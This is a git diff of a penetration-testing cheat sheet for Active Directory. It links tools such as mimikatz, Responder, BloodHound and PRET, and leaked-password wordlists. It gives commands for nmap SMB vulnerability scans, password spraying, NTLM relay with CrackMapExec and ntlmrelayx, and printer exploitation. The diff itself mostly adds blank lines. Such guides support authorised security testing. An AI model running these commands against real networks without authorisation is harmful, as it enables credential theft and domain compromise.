@@ -4,20 +4,26 @@ How to pentest like a Gunnaj
 ## Tools bby
 ### linWinPwn - Active Directory Vulnerability Scanner
 https://github.com/lefayjey/linWinPwn
+
 ### BloodHound
 https://github.com/fox-it/BloodHound.py
+
 ### mimikatz
 https://github.com/ParrotSec/mimikatz
+
 ### Responder
 https://github.com/lgandx/Responder
+
 ### breach-parse
 https://github.com/hmaverickadams/breach-parse
+
 ### PRET
 https://github.com/RUB-NDS/PRET
 
 ## Wordlists bby
-### Create your own wordlist
+### Generate wordlist
 https://zzzteph.github.io/weakpass/
+
 ### Top 10 million
 https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)
 
@@ -36,19 +42,23 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 ```bash
 sudo nmap -sP -p <output.txt> <IP/mask>
 ```
+
 #### Full scan
 ```bash
 sudo nmap -PN -sC -sV -p- -oA <output.txt> <IP/mask>
 ```
+
 #### smb vuln scan
 ```bash
 sudo nmap -PN --script smb-vuln* -p139,445 -oA <output.txt> <IP/mask>
 ```
+
 ## Find DC IP
 #### Show domain name and DNS
 ```bash
 sudo mncli dev show eth0
 ```
+
 #### Show DC IP
 ```bash
 nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
@@ -73,6 +83,7 @@ nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
 ```bash
  sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
 ```
+
 ### With AD-user credentials 
 - DNS extraction using adidnsdump
 - Module ad_enum
@@ -107,6 +118,7 @@ nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
 ```bash
 sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
 ```
+
 ## Password spray
 ### Spray a password on a user list
 ```bash
@@ -143,10 +155,12 @@ $lnk.Save()
 ```bash
 crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
 ```
+
 #### NTLMRelayx
 ```bash
 sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
 ```
+
 #### Disbale SMB and HTTP in Responder.conf
 ```bash
 [Responder Core]
@@ -195,8 +209,6 @@ nmap -p 9100 <IP/mask>
 ```bash
 pret.py target {ps,pjl,pcl}
 ```
-## Zero Logon
-* in the making 
 
 ## Hash cracking
 ### LM
